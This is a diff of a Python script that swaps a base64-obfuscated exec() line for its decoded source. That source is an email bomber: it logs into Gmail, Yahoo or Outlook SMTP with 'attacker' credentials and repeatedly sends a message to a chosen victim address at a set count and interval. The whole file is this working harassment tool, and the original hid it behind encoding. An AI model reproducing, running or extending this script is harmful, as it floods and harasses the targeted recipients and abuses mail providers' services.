@@ -1,2 +1,149 @@
 #!/use/bin/env python3
-import base64; exec(base64.b64decode(b'IyEvdXNlL2Jpbi9lbnYgcHl0aG9uMwojQ29kZWQgYnkgU2FqamFkLgojaHR0cHM6Ly9naXRodWIuY29tL0N5YmVyLUFub255bW91cwoKaW1wb3J0IHNtdHBsaWIKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCBsb2dvCmltcG9ydCBzeXMKaW1wb3J0IHJlcXVlc3RzCgoKV2hpdGU9IlwwMzNbMDswbSIKUmVkPSJcMDMzWzkxbSIKR3JlZW49IlwwMzNbOTJtIgpZZWxsb3c9IlwwMzNbOTNtIgpCbHVlPSJcMDMzWzk0bSIKQ3lhbj0iXDAzM1s5Nm0iCkJvbGQ9IlwwMzNbMW0iCkNsZWFyPSJcMDMzWzA7MDswbSIKCm9zLnN5c3RlbSgiY2xlYXIiKQoKcHJpbnQobG9nby5sb2dvKCkpCnByaW50KCIgIikKcHJpbnQoIiAiKQpwcmludCgiICIpCnByaW50KCIgIikKCnRyeToKCXJlcXVlc3RzLmdldCgiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSIpCmV4Y2VwdDoKCXByaW50KCJTVEFUVVMgIitSZWQrIk9GRkxJTkUiLENsZWFyKQoJdHJ5OgoJCW9zLnN5c3RlbSgicHl0aG9uMyBlbS1ib21iZXIucHkiKQoJZXhjZXB0OgoJCXBhc3MKdHJ5OgoJc2VydmVyPWlucHV0KEJvbGQrIk1haWwgc2VydmVyOiAiK0NsZWFyKS5sb3dlcigpCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKCXN5cy5leGl0KCJcbkNhbmNlbGVkXG4iKQoKaWYgc2VydmVyID09ICJnbWFpbCI6Cglwb3J0ID0gNTg3CgkKZWxpZiBzZXJ2ZXIgPT0gInlhaG9vIjoKCXBvcnQgPSA0NjUKCmVsaWYgc2VydmVyID09ICJob3RtYWlsIiBvciBzZXJ2ZXIgPT0gIm91dGxvb2siOgoJcG9ydCA9IDU4NwoJCmVsc2U6Cglwb3J0PWlucHV0KEJvbGQrIlxuUG9ydDogIitDbGVhcikKCQppZiAoc2VydmVyPT0iZ21haWwiKToKCXRyeToKCQllbWFpbD1zbXRwbGliLlNNVFAoInNtdHAue30uY29tIi5mb3JtYXQoc2VydmVyKSxwb3J0KQoJCWVtYWlsLnN0YXJ0dGxzKCkKCWV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyb3I6CgkJcHJpbnQoIiIpCgkJcHJpbnQoZXJyb3IpCgkJc3lzLmV4aXQoIiIpCgplbGlmKHNlcnZlcj09InlhaG9vIik6CgkJdHJ5OgoJCQllbWFpbD1zbXRwbGliLlNNVFAoInNtdHAubWFpbC57fS5jb20iLmZvcm1hdChzZXJ2ZXIpLHBvcnQpCgkJCWVtYWlsLnN0YXJ0dGxzKCkKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGVycm9yOgoJCQkJcHJpbnQoIiIpCgkJCQlwcmludChlcnJvcikKCQkJCXByaW50KCIiKQoJCQkJc3lzLmV4aXQoKQplbHNlOgoJdHJ5OgoJCXRyeToKCQkJZW1haWw9c210cGxpYi5TTVRQKCJzbXRwLnt9LmNvbSIuZm9ybWF0KHNlcnZlcikscG9ydCkKCQlleGNlcHQ6CgkJCWVtYWlsPXNtdHBsaWIuU01UUCgic210cC5tYWlsLnt9LmNvbSIuZm9ybWF0KHNlcnZlcikscG9ydCkKCWV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyb3I6CgkJcHJpbnQoIiIpCgkJcHJpbnQoZXJyb3IpCgkJc3lzLmV4aXQoIiIpCgkJCQoJCQp1c2VyX2VtYWlsPWlucHV0KEJvbGQrIlxuQXR0YWNrZXIgSUQ6ICIrQ2xlYXIpCnVzZXJfcGFzc3dvcmQ9Z2V0cGFzcy5nZXRwYXNzKEJvbGQrIlxuUGFzc3dvcmQ6ICIrQ2xlYXIpCnRyeToKCWVtYWlsLmxvZ2luKHVzZXJfZW1haWwsdXNlcl9wYXNzd29yZCkKZXhjZXB0OgoJcHJpbnQoQm9sZCtSZWQrIlxuVW5hYmxlIHRvIGxvZ2luLiIsQ2xlYXIpCglzeXMuZXhpdCgpCgpyZWNlaXZlcl9lbWFpbD1pbnB1dChCb2xkKyJcblJlY2VpdmVyIElEOiAiK0NsZWFyKQptYXNzYWdlPWlucHV0KEJvbGQrIlxuTWFzc2FnZTogIitDbGVhcikKCmFtb3VudD1pbnB1dChCb2xkKyJcbk51bWJlciBvZiBzZW5kIGVtYWlscyAoZGVmYXVsdHMgWzEwXSk6ICIrQ2xlYXIpCnRyeToKCWFtb3VudD1pbnQoYW1vdW50KQpleGNlcHQ6CglhbW91bnQ9MTAKCndhaXQ9aW5wdXQoQm9sZCsiXG5UaW1lIChzZWNvbmQpIHRvIHNlbmQgcGVyIGVtYWlsIChkZWZhdWx0IFs1XSk6ICIrQ2xlYXIpCnRyeToKCXdhaXQ9aW50KHdhaXQpCmV4Y2VwdDoKCXdhaXQ9NQoJCnByaW50KCIiKQoKY291bnQ9MApmYWlsZWQ9MAoKd2hpbGUgKFRydWUpOgoJY291bnQrPTEKCXRyeToKCQl0aW1lLnNsZWVwKHdhaXQpCgkJZW1haWwuc2VuZG1haWwodXNlcl9lbWFpbCxyZWNlaXZlcl9lbWFpbCxtYXNzYWdlKQoJCXByaW50KEJvbGQrIlxuU3VjY2VzZnVsbHkgc2VudCB7fSIuZm9ybWF0KGNvdW50KStDbGVhcikKCQoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXByaW50KCJcbkNhbmNlbGVkIikKCQlicmVhawoJCXN5cy5leGl0KCkKCWV4Y2VwdDoKCQlmYWlsZWQrPTEKCQlwcmludChCb2xkKyJcbkZhaWxlZCB0byBzZW5kIHt9Ii5mb3JtYXQoZmFpbGVkKStDbGVhcikKCQkKCWlmIChjb3VudD09YW1vdW50KToKCQl0cnk6CgkJCWVtYWlsLnF1aXQoKQoJCWV4Y2VwdDoKCQkJcGFzcwkKCQlicmVhawoJCnByaW50KCIiKQpwcmludCgiIikKCiIiIgpzdWNjZXNzZnVsbHlfc2VudD1jb3VudC1mYWlsZWQKCnByaW50KEJvbGQrR3JlZW4rIlxuU3VjY2Vzc2Z1bGx5IHNlbnQge30gLiIuZm9ybWF0KHN1Y2Nlc3NmdWxseV9zZW50KStDbGVhcikKaWYgKGZhaWxlZD09MCk6Cgljb2xvdXI9R3JlZW4KZWxzZToKCWNvbG91cj1SZWQKcHJpbnQoQm9sZCtjb2xvdXIrIlxuRmFpbGVkIHRvIHNlbmQge30gLiIuZm9ybWF0KGZhaWxlZCkrQ2xlYXIpCnByaW50KENsZWFyKQoiIiI='))
+#Coded by Sajjad.
+#https://github.com/Cyber-Anonymous
+
+import smtplib
+import getpass
+import time
+import os
+import logo
+import sys
+import requests
+
+
+White="\033[0;0m"
+Red="\033[91m"
+Green="\033[92m"
+Yellow="\033[93m"
+Blue="\033[94m"
+Cyan="\033[96m"
+Bold="\033[1m"
+Clear="\033[0;0;0m"
+
+os.system("clear")
+
+print(logo.logo())
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+
+try:
+	requests.get("https://www.google.com")
+except:
+	print("STATUS "+Red+"OFFLINE",Clear)
+	try:
+		os.system("python3 em-bomber.py")
+	except:
+		pass
+try:
+	server=input(Bold+"Mail server: "+Clear).lower()
+except KeyboardInterrupt:
+	sys.exit("\nCanceled\n")
+
+if server == "gmail":
+	port = 587
+	
+elif server == "yahoo":
+	port = 465
+
+elif server == "hotmail" or server == "outlook":
+	port = 587
+	
+else:
+	port=input(Bold+"\nPort: "+Clear)
+	
+if (server=="gmail"):
+	try:
+		email=smtplib.SMTP("smtp.{}.com".format(server),port)
+		email.starttls()
+	except Exception as error:
+		print("")
+		print(error)
+		sys.exit("")
+
+elif(server=="yahoo"):
+		try:
+			email=smtplib.SMTP("smtp.mail.{}.com".format(server),port)
+			email.starttls()
+		except Exception as error:
+				print("")
+				print(error)
+				print("")
+				sys.exit()
+else:
+	try:
+		try:
+			email=smtplib.SMTP("smtp.{}.com".format(server),port)
+		except:
+			email=smtplib.SMTP("smtp.mail.{}.com".format(server),port)
+	except Exception as error:
+		print("")
+		print(error)
+		sys.exit("")
+			
+		
+user_email=input(Bold+"\nAttacker ID: "+Clear)
+user_password=getpass.getpass(Bold+"\nPassword: "+Clear)
+try:
+	email.login(user_email,user_password)
+except:
+	print(Bold+Red+"\nUnable to login.",Clear)
+	sys.exit()
+
+receiver_email=input(Bold+"\nReceiver ID: "+Clear)
+massage=input(Bold+"\nMassage: "+Clear)
+
+amount=input(Bold+"\nNumber of send emails (defaults [10]): "+Clear)
+try:
+	amount=int(amount)
+except:
+	amount=10
+
+wait=input(Bold+"\nTime (second) to send per email (default [5]): "+Clear)
+try:
+	wait=int(wait)
+except:
+	wait=5
+	
+print("")
+
+count=0
+failed=0
+
+while (True):
+	count+=1
+	try:
+		time.sleep(wait)
+		email.sendmail(user_email,receiver_email,massage)
+		print(Bold+"\nSuccesfully sent {}".format(count)+Clear)
+	
+	except KeyboardInterrupt:
+		print("\nCanceled")
+		break
+		sys.exit()
+	except:
+		failed+=1
+		print(Bold+"\nFailed to send {}".format(failed)+Clear)
+		
+	if (count==amount):
+		try:
+			email.quit()
+		except:
+			pass	
+		break
+	
+print("")
+print("")
+
+"""
+successfully_sent=count-failed
+
+print(Bold+Green+"\nSuccessfully sent {} .".format(successfully_sent)+Clear)
+if (failed==0):
+	colour=Green
+else:
+	colour=Red
+print(Bold+colour+"\nFailed to send {} .".format(failed)+Clear)
+print(Clear)
+"""
